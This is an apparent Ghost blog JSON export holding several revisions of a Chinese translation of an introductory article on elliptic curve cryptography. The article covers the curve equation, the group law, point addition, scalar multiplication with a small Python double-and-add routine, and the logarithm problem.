那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[10,49],[1,\"p\",[]]]}","created_at_ts":1577086844920,"created_at":"2019-12-23 07:40:44"},{"id":"5e0089252ee0ee0001819a63","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"html\",{\"html\":\"<a id=\\\"elliptic-curves\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"algebraic-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p id=\\\"double-and-add\\\">\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[10,49],[10,50],[1,\"p\",[]]]}","created_at_ts":1577093413150,"created_at":"2019-12-23 09:30:13"},{"id":"5e01773c2ee0ee0001819b49","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"html\",{\"html\":\"<a id=\\\"elliptic-curves\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 